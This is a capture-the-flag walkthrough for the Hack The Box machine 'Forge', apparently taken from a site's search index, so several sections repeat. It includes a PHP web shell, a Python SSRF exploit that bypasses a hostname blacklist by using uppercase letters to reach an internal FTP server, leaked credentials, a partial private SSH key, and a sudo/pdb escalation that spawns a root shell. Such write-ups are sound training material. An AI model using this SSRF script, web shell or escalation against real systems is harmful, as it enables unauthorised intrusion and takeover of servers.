KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3 rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE ... url> Saving the private key allows us to SSH in as user : $ ssh -i user-id_rsa user@forge.htb Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64) ... Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6 user@forge:~$ Root # Running sudo -l shows us our path to root : user@forge:~$ sudo -l Matching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py user@forge:~$ The Python script is straightforward: #!/usr/bin/env python3 import socket import random import subprocess import pdb port = random . randint ( 1025 , 65535 ) try : sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) sock . bind (( '127.0.0.1' , port )) sock . listen ( 1 ) print ( f 'Listening on localhost: { port } ' ) ( clientsock , addr ) = sock . accept () clientsock . send ( b 'Enter the secret passsword: ' ) if clientsock . recv ( 1024 ) . strip () . decode () != 'secretadminpassword' : clientsock . send ( b 'Wrong password! \\n ' ) else : clientsock . send ( b 'Welcome admin! \\n ' ) while True : clientsock . send ( b ' \\n What do you wanna do: \\n ' ) clientsock . send ( b '[1] View processes \\n ' ) clientsock . send ( b '[2] View free memory \\n ' ) clientsock . send ( b '[3] View listening sockets \\n ' ) clientsock . send ( b '[4] Quit \\n ' ) option = int ( clientsock . recv ( 1024 ) . strip ()) if option == 1 : clientsock . send ( subprocess . getoutput ( 'ps aux' ) . encode ()) elif option == 2 : clientsock . send ( subprocess . getoutput ( 'df' ) . encode ()) elif option == 3 : clientsock . send ( subprocess . getoutput ( 'ss -lnt' ) . encode ()) elif option == 4 : clientsock . send ( b 'Bye \\n ' ) break except Exception as e : print ( e ) pdb . post_mortem ( e . __traceback__ ) finally : quit () The script picks a random high port and listens it for an incoming connection. If the user enters the password secretadminpassword , a menu is presented to run various utilities: ps , df , and ss . The main body of the script is wrapped in a try/except block to catch any exceptions, calling the Python debugger pdb if one occurs. If we can cause an exception, we'll gain access to pdb running as root. The easiest location to do this would be in this call here: option = int ( clientsock . recv ( 1024 ) . strip ()) Entering a non-integer will raise a ValueError exception and dump us into the debugger. By running the script in one shell session, connecting to it in a second, and entering a string into the prompt, we see the pdb debugger in the first session: user@forge:~$ nc localhost 43320 Enter the secret passsword: secretadminpassword Welcome admin! What do you wanna do: [1] View processes [2] View free memory [3] View listening sockets [4] Quit pugpug user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:43320 invalid literal for int() with base 10: b'pugpug' > /opt/remote-manage.py(27)<module>() -> option = int(clientsock.recv(1024).strip()) (Pdb) The second shell hangs while pdb is running, but we can easily now spawn a shell as root from pdb : (Pdb) import os (Pdb) os.system('/bin/bash') root@forge:/home/user# cat /root/root.txt 8b4a2fb64e2fa7602574... root@forge:/home/user# Final thoughts # I enjoyed this box. The path to root was straightforward and felt like a realistic scenario that I might encounter in the real world. -- pugpug","title":"Forge"},{"location":"machines/Forge/#forge-linux-medium","text":"Forge is a medium-rated Linux machine by NoobHacker99 . We'll exploit two Server-Side Request FORGEry vulnerabilities to gain access to an internal-only FTP server with an ssh private key for access to the machine. To gain root, we'll break a Python script and use the Python debugger to execute a shell.","title":"Forge (Linux Medium)"},{"location":"machines/Forge/#reconnaissance","text":"An initial nmap scan shows only 3 ports open: 21, 22, and 80: # nmap -v -n -p- -Pn -sS -O -oA forge-alltcp 10 .10.11.111 Nmap scan report for 10.10.11.111 Host is up (0.048s latency). Not shown: 65532 closed ports PORT STATE SERVICE 21/tcp filtered ftp 22/tcp open ssh 80/tcp open http The FTP service is listed as filtered , most likely by an iptables rule to block traffic not from the local host. Scanning the services doesn't reveal much either: # nmap -n -v -p 22 ,80 -sCV -Pn -oA forge-services 10 .10.11.111 Nmap scan report for 10.129.204.175 Host is up (0.035s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://forge.htb Service Info: Host: 10.129.204.175; OS: Linux; CPE: cpe:/o:linux:linux_kernel The OpenSSH and apache versions indicate this is likely an Ubuntu 20.04 machine. The redirect to http://forge.htb is noteworthy, indicating we should check for other named-based virtual hosts on the web server. My preferred tool for this is wfuzz : $ wfuzz -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.forge.htb' http://10.10.11.111 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.11.111/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 302 9 L 26 W 279 Ch \"www\" 000000012: 302 9 L 26 W 279 Ch \"ns2\" 000000011: 302 9 L 26 W 279 Ch \"ns1\" 000000014: 302 9 L 26 W 286 Ch \"autoconfig\" 000000003: 302 9 L 26 W 279 Ch \"ftp\" ^C I'll run an initial fuzz to see how the web server responds, then run it again and filter out the negative results. In this instance, we can filter out responses with a word count of 26 words: $ wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.forge.htb' --hw 26 http://10.10.11.111 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.11.111/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000024: 200 1 L 4 W 27 Ch \"admin\" 000009532: 400 12 L 53 W 425 Ch \"#www\" 000010581: 400 12 L 53 W 425 Ch \"#mail\" Total time: 83.94768 Processed Requests: 19966 Filtered Requests: 19963 Requests/sec.: 237.8386 wfuzz shows there is a website at http://admin.forge.htb as well. After adding 10.10.11.111 forge.htb admin.forge.htb to /etc/hosts , we can view the site in a browser: The 'Upload an image' link takes us to a web form where we can either upload a file from our local machine, or input an URL that the server will use to download an image for us. If not implemented correctly, this type of service can be abused to access resources that might not be directly accessible. Attemping to access the admin site is unsuccessful, but does provide a valuable clue: we can access the site from requests sent from the local machine. That gives us our path forward: finding a way to coerce the upload function into sending requests to the services on the local machine that are blocked to outside requests.","title":"Reconnaissance"},{"location":"machines/Forge/#foothold","text":"We'll begin with attempting to learn how the upload function behaves. We can start a netcat listener on a port, then put our IP address in the upload function to see whether the site will attempt to contact us: $ nc -vnlp 8008 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::8008 Ncat: Listening on 0.0.0.0:8008 Upon submitting the request, we get a response in our netcat listener: $ nc -vnlp 8008 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::8008 Ncat: Listening on 0.0.0.0:8008 Ncat: Connection from 10.10.11.111. Ncat: Connection from 10.10.11.111:51044. GET /pugpug HTTP/1.1 Host: 10.10.14.8:8008 User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive ^C By starting a Python web server, we can see how the application behaves when we send a valid file: $ cat pug.php <?php echo \"<pre>\"; system($_GET[cmd]); ?> $ python3 -m http.server 8008 Serving HTTP on 0.0.0.0 port 8008 (http://0.0.0.0:8008/) ... 10.10.11.111 - - [22/Jan/2022 15:46:07] \"GET /pug.php HTTP/1.1\" 200 - We see in the response from the web server that it saves our data to a random filename: Fetching the URL returns the content of the transferred file: $ curl http://forge.htb/uploads/9q7dl5j6hFE25xaSgSwV <?php echo \"<pre>\"; system($_GET[cmd]); ?>","title":"Foothold"},{"location":"machines/Forge/#user","text":"As we'll be poking at the website to determine how to leverage the SSRF vulnerability, I'll write a quick script to quickly send requests to the server and fetch the results. While it's possible to perform this either through the browser or via an attack proxy such as Burp, my preference is to create scripts to make the process easier. #!/usr/bin/env python3 # Exploit the SSRF vulnerability on forge.htb to retrieve data from # internal services. # # Joe Ammond (pugpug) import requests from cmd import Cmd from bs4 import BeautifulSoup url = 'http://forge.htb/upload' # Abuse the SSRF on the main site def fetch ( args ): data = { 'url' : args , 'remote' : '1' } # POST request r = requests . post ( url , data = data ) # Parse initial response, find href to upload URL, get it. Finding the # uploaded URL is ugly. We wrap it in a try/except in case we hit the # filter or the the request fails. soup = BeautifulSoup ( r . text , 'html.parser' ) try : data = soup . find_all ( 'strong' )[ 1 ] . text except : return r . text r = requests . get ( data ) return r . text class Term ( Cmd ): prompt = 'url> ' def default ( self , args ): print ( fetch ( args )) if __name__ == '__main__' : term = Term () term . cmdloop () The upload function accepts an HTTP POST request, with two required parameters: url , the URL for the server to process, and remote , which is set to 1 to specify a remote file. We send the entered URL to the upload service and process the results. If the request is successful, we parse out the URL where the data has been written to, fetch it and return the content. In the event of a failed request, we return the response from the POST to see any errors. Running the script and entering the same URL as the screenshot above shows the script is working: $ python3 ssrf-base.py url> http://10.10.14.8:8008/pug.php <?php echo \"<pre>\"; system($_GET[cmd]); ?> url> Attemping to access either the admin site or the FTP server results in errors: url> http://admin.forge.htb ... <center> <strong>URL contains a blacklisted address!</strong> </center> ... url> ftp://127.0.0.1/ ... <center> <strong>Invalid protocol! Supported protocols: http, https</strong> </center> ... After trying some different filter bypass techniques, on a whim I attempted entering the hostname in uppercase. Success: url> http://ADMIN.FORGE.HTB <!DOCTYPE html> <html> <head> <title>Admin Portal</title> </head> <body> <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\"> <header> <nav> <h1 class=\"\"><a href=\"/\">Portal home</a></h1> <h1 class=\"align-right margin-right\"><a href=\"/announcements\">Announcements</a></h1> <h1 class=\"align-right\"><a href=\"/upload\">Upload image</a></h1> </nav> </header> <br><br><br><br> <br><br><br><br> <center><h1>Welcome Admins!</h1></center> </body> </html> The /announcements URL gives us the next part of getting to user: url> http://ADMIN.FORGE.HTB/announcements ... <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li> <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li> <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li> ... Attemping to use the credentials to access the machine via SSH fails: $ ssh user@forge.htb user@forge.htb: Permission denied (publickey). However, it looks like we can use the SSRF vulnerability on the main page to access the /upload URL on the admin site, which may give us access to the internal FTP server. We can modify the fetch() function to route any URLs through the admin site: # Abuse the SSRF on the main site, routing the request to admin.forge.htb, # as the admin site accepts more request types. def fetch ( args ): data = { 'url' : 'http://ADMIN.FORGE.HTB/upload?u= {} ' . format ( args ), 'remote' : '1' } # POST request r = requests . post ( url , data = data ) # Parse initial response, find href to upload URL, get it. Finding the # uploaded URL is ugly. We wrap it in a try/except in case we hit the # filter or the the request fails. soup = BeautifulSoup ( r . text , 'html.parser' ) try : data = soup . find_all ( 'strong' )[ 1 ] . text except : return r . text r = requests . get ( data ) # Parse the second page returned, to see whether the request from # admin was successful. soup = BeautifulSoup ( r . text , 'html.parser' ) try : data = soup . find_all ( 'strong' )[ 1 ] . text except : # We couldn't parse it as HTML, so return the text directly return r . text # We got a second link in the returned page, so fetch it and return # the content. r = requests . get ( data ) return r . text After modifying the script, we can see whether the /upload function on the admin site has any additional functionality. Attempting a file:/// URL shows that in addition to HTTP and HTTPS , we can now access FTP and FTPS URLs as well: $ python ssrf.py url> file:///etc/passwd Invalid protocol! Supported protocols: http, https, ftp, ftps. url> We can access the internal FTP server using the credentials provided and grab user.txt : url> ftp://user:heightofsecurity123!@FORGE.HTB/ drwxr-xr-x 3 1000 1000 4096 Aug 04 19:23 snap -rw-r----- 1 0 1000 33 Jan 22 20:07 user.txt url> ftp://user:heightofsecurity123!@FORGE.HTB/user.txt 737124c79df00af1e2bec4... url> The snap directory is an indication that we have accessed the home directory of the user account. Since we know we can't use password authentication with SSH , we can look for a .ssh directory, which may contain a private key: url> ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/ -rw------- 1 1000 1000 564 May 31 2021 authorized_keys -rw------- 1 1000 1000 2590 May 20 2021 id_rsa -rw------- 1 1000 1000 564 May 20 2021 id_rsa.pub url> ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3 rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE ... url> Saving the private key allows us to SSH in as user : $ ssh -i user-id_rsa user@forge.htb Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64) ... Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6 user@forge:~$","title":"User"},{"location":"machines/Forge/#root","text":"Running sudo -l shows us our path to root : user@forge:~$ sudo -l Matching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py user@forge:~$ The Python script is straightforward: #!/usr/bin/env python3 import socket import random import subprocess import pdb port = random . randint ( 1025 , 65535 ) try : sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) sock . bind (( '127.0.0.1' , port )) sock . listen ( 1 ) print ( f 'Listening on localhost: { port } ' ) ( clientsock , addr ) = sock . accept () clientsock . send ( b 'Enter the secret passsword: ' ) if clientsock . recv ( 1024 ) . strip () . decode () != 'secretadminpassword' : clientsock . send ( b 'Wrong password! \\n ' ) else : clientsock . send ( b 'Welcome admin! \\n ' ) while True : clientsock . send ( b ' \\n What do you wanna do: \\n ' ) clientsock . send ( b '[1] View processes \\n ' ) clientsock . send ( b '[2] View free memory \\n ' ) clientsock . send ( b '[3] View listening sockets \\n ' ) clientsock . send ( b '[4] Quit \\n ' ) option = int ( clientsock . recv ( 1024 ) . strip ()) if option == 1 : clientsock . send ( subprocess . getoutput ( 'ps aux' ) . encode ()) elif option == 2 : clientsock . send ( subprocess . getoutput ( 'df' ) . encode ()) elif option == 3 : clientsock . send ( subprocess . getoutput ( 'ss -lnt' ) . encode ()) elif option == 4 : clientsock . send ( b 'Bye \\n ' ) break except Exception as e : print ( e ) pdb . post_mortem ( e . __traceback__ ) finally : quit () The script picks a random high port and listens it for an incoming connection. If the user enters the password secretadminpassword , a menu is presented to run various utilities: ps , df , and ss . The main body of the script is wrapped in a try/except block to catch any exceptions, calling the Python debugger pdb if one occurs. If we can cause an exception, we'll gain access to pdb running as root. The easiest location to do this would be in this call here: option = int ( clientsock . recv ( 1024 ) . strip ()) Entering a non-integer will raise a ValueError exception and dump us into the debugger. By running the script in one shell session, connecting to it in a second, and entering a string into the prompt, we see the pdb debugger in the first session: user@forge:~$ nc localhost 43320 Enter the secret passsword: secretadminpassword Welcome admin! What do you wanna do: [1] View processes [2] View free memory [3] View listening sockets [4] Quit pugpug user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:43320 invalid literal for int() with base 10: b'pugpug' > /opt/remote-manage.py(27)<module>() -> option = int(clientsock.recv(1024).strip()) (Pdb) The second shell hangs while pdb is running, but we can easily now spawn a shell as root from pdb : (Pdb) import os (Pdb) os.system('/bin/bash') root@forge:/home/user# cat /root/root.txt 8b4a2fb64e2fa7602574... root@forge:/home/user#","title":"Root"},{"location":"machines/Forge/#final-thoughts","text":"I enjoyed this box. The path to root was straightforward and felt like a realistic scenario that I might encounter in the real world. -- pugpug","title":"Final thoughts"}]}